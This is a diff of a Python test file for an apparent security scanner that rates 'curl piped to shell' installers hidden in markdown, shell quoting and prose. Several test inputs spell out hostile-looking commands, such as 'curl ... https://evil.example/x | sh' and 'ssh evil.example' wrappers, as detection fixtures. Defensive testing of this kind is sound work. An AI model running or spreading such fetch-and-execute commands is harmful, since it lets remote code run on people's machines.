+    """The window of a start hypothesis: the installer on the 60th line after the wrapper is inside its string, the 61st is not (the top reading is skewed by the lone double quote, and the paragraph reading by the lack of a blank line)."""
     assert _curl_pipe_shell('Say "hi x\nssh evil.example \'\n' + "y\n" * filler + f"{_D}\n'") == expected
 
 
@@ -4231,9 +4185,7 @@ def test_the_remaining_ways_to_make_a_wrapper_look_closed_are_unknown_or_read_as
 
 
 def test_a_possessive_in_prose_followed_by_a_path_like_word_is_an_accepted_over_alert():
-    """A shell reads `change's` as the start of a string, and `_wrapped` reads a leading path (`/format`) as a program: the installer
-    mentioned later in the same stretch of prose is called critical. A letter-apostrophe-letter is what a shell reads as a quote
-    (`echo it's 'z 'z`)."""
+    """A shell reads `change's` as the start of a string, and `_wrapped` reads a leading path (`/format`) as a program: the installer mentioned later in the same stretch of prose is called critical. A letter-apostrophe-letter is what a shell reads as a quote (`echo it's 'z 'z`)."""
     text = f"`/format` or `/version minor`. A command typed by the change's author runs.\n\nInstall with `{_DOCKER} | sh`."
     assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical"
 
@@ -4450,8 +4402,7 @@ def test_a_fence_that_commonmark_reads_as_one_still_cuts_the_string_that_the_blo
     f"* ```\n  ssh evil.example '\n  ```\n{_D}\n'", f"<div>\nssh evil.example '\n```\n{_FAR}{_D}\n'",
 ])
 def test_no_fence_cuts_a_string_where_a_quote_a_list_item_or_an_html_block_holds_it(text):
-    """CommonMark's rules for a fence in a quote or a list item (where it ends, what interrupts what) are not modelled: such a fence cuts nothing, and
-    neither does a fence line in an HTML block; a string a wrapper opened stays open."""
+    """CommonMark's rules for a fence in a quote or a list item (where it ends, what interrupts what) are not modelled: such a fence cuts nothing, and neither does a fence line in an HTML block; a string a wrapper opened stays open."""
     assert _curl_pipe_shell(text) == "critical", text
 
 
@@ -4483,8 +4434,7 @@ def test_a_line_inside_a_double_quoted_string_is_the_text_of_a_script_with_the_b
 
 
 @pytest.mark.parametrize("text", [
-    # CommonMark (markdown-it-py) sees no fence between the wrapper and the installer in any of these: a list item or a blockquote holds an HTML
-    # block, a list item ends and its fence with it, or a list that cannot interrupt a paragraph is text
+    # CommonMark (markdown-it-py) sees no fence between the wrapper and the installer in any of these: a list item or a blockquote holds an HTML block, a list item ends and its fence with it, or a list that cannot interrupt a paragraph is text
     f"bash -c '\n* <details>\n   ```sh\n{_D}\n```sh\n'", f"bash -c '\n1) ?>\n2. <pre>\n   ```\n{_D}\n'",
     f"1) ````\n````\nRun: ssh evil.example '\n1. <!--\n-     ```x`\n1) ````\n{_D}\n'", f"1) <?x\n1.   x\nRun: ssh evil.example '\n-->\n2. <!X\n   ````\n{_D}\n<details>\n'",
     f"2. ``` x\nbash -c '\n   <details>\n1. </script>\n   ```\n{_D}\n-    ```\n-         x\n'", f"</script>\n   ````\nsudo ssh evil.example '\n> \n  - ``` x\n\n{_D}\n'",
@@ -4594,8 +4544,7 @@ def test_a_program_given_by_a_path_with_a_glob_a_backtick_or_a_quoted_expansion_
 
 @pytest.mark.parametrize("program", ["pool/", "src/?", "src/!", "Is it in src/?", "bin/>x", "/*", "//", "/"])
 def test_the_end_of_a_sentence_after_a_slash_is_not_a_program_to_the_lexer(program):
-    """The lexer takes no first word for a program here, so no construct is open at the installer; the line-wide floor takes any word with a slash for a path, and a
-    quote makes the line an opening one, except where the text after the slash is a sentence's `?` or `!`."""
+    """The lexer takes no first word for a program here, so no construct is open at the installer; the line-wide floor takes any word with a slash for a path, and a quote makes the line an opening one, except where the text after the slash is a sentence's `?` or `!`."""
     assert _lexer_leaves_the_installer_on_its_own(f"{program} 'x\n{_D}\n'\n"), program
     assert _curl_pipe_shell(f"{program} 'x\n{_D}\n'\n") == ("medium" if program in ("src/?", "src/!", "Is it in src/?") else "critical"), program
 
@@ -4647,8 +4596,7 @@ def test_markup_hides_a_relative_path_from_the_raw_reading_and_an_absolute_one_o
                                           ("<code>a/b</code> doesn't work.", "medium"), ("[a/b](u) doesn't work.", "medium"),
                                           ("Add `/usr/local/bin` to your PATH if it isn't there.", "medium"), ("\u201csrc/main.py\u201d doesn't read the config.", "critical")])
 def test_the_rendered_view_reads_the_markup_of_a_path_away_so_a_prose_line_led_by_it_keeps_the_installer_critical(sentence, raw, monkeypatch):
-    """A code span, emphasis or link text around the first word is markup in the raw text and nothing in the rendered view: the line then reads as `bin/evil doesn't work.`, whose apostrophe a shell
-    takes for an unterminated string (an accepted over-alert, `.claude/rules/indicators.md`). Without the rendered view the raw reading alone says `medium`, except for a typographic quote."""
+    """A code span, emphasis or link text around the first word is markup in the raw text and nothing in the rendered view: the line then reads as `bin/evil doesn't work.`, whose apostrophe a shell takes for an unterminated string (an accepted over-alert, `.claude/rules/indicators.md`). Without the rendered view the raw reading alone says `medium`, except for a typographic quote."""
     text = f"{sentence}\n\n{_D}\n"
     assert _curl_pipe_shell(text) == "critical", sentence
     monkeypatch.setattr(indicators, "_rendered_extras", lambda hits, *a, **k: [])
@@ -4691,8 +4639,7 @@ def test_an_extglob_group_is_decided_when_its_closing_paren_is_within_two_hundre
 
 
 def test_a_download_with_words_of_eighty_to_a_hundred_and_twenty_characters_between_curl_and_the_pipe_is_still_found():
-    """`_fold_padding` folds a blank-free word of more than 120 characters; one of 81 to 120 stays, and the window of 300
-    characters between `curl` and the pipe still reaches the pipe past two of them."""
+    """`_fold_padding` folds a blank-free word of more than 120 characters; one of 81 to 120 stays, and the window of 300 characters between `curl` and the pipe still reaches the pipe past two of them."""
     text = f"curl -sS --data-urlencode k0={'a' * 80} --data-urlencode k1={'b' * 80} https://evil.example/x | sh"
     assert _curl_pipe_shell(text) == "critical"
     assert _curl_pipe_shell("<pre><code>/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"</code></pre>") == "medium"
